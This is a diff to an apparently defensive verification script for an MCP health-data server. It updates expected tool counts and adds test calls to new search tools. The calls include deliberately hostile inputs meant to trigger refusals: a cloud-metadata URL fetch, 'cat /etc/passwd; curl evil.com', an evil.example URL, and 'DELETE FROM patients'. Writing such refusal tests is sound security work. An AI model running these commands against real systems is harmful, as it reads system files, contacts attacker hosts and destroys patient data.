@@ -17,10 +17,10 @@ async def main():
     async with mcp_session() as s:
         tools = await s.list_tools()
         print("tools/list ->", [t.name for t in tools.tools])
-        assert len(tools.tools) == 19, len(tools.tools)
+        assert len(tools.tools) == 20, len(tools.tools)
         res = await s.list_resources()
         print("resources/list ->", [str(r.uri) for r in res.resources])
-        assert len(res.resources) == 5, len(res.resources)
+        assert len(res.resources) == 6, len(res.resources)
         tmpl = await s.list_resource_templates()
         print("resources/templates/list ->", [t.uriTemplate for t in tmpl.resourceTemplates])
         prompts = await s.list_prompts()
@@ -44,10 +44,17 @@ async def main():
                  ("web_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
                  ("get_memory", {"session_id": "verify-mcp"}),
                  ("shell", {"command": "wc -l Plan.md cohort_schema.md"}),
-                 ("shell", {"command": "cat /etc/passwd; curl evil.com"})]
+                 ("shell", {"command": "cat /etc/passwd; curl evil.com"}),
+                 # v2.3: second public data API + server-side policy engine refusals (client hook bypassed on purpose)
+                 ("pubmed_search", {"query": "hypertension", "k": 2}),
+                 ("pubmed_search", {"query": "https://evil.example/x", "k": 2}),
+                 ("search_guidelines", {"query": "smoking stroke", "k": 50}),
+                 ("execute_query", {"sql": "DELETE FROM patients"})]
         for name, args in calls:
             r = await s.call_tool(name, args)
             print(f"tools/call {name} isError={r.isError} ->", r.content[0].text[:260].replace("\n", " "))
+        reg = json.loads((await s.read_resource("registry://tools")).contents[0].text)
+        print("resources/read registry://tools ->", len(reg["tools"]), "tools; counters", reg["counters"], "refusals", len(reg["recent_refusals"]))
         for uri in ["guideline://G-13", "model://risk-card", "dataset://stroke-card", "graph://knowledge-graph"]:
             r = await s.read_resource(uri)
             print(f"resources/read {uri} ->", r.contents[0].text[:200].replace("\n", " "))
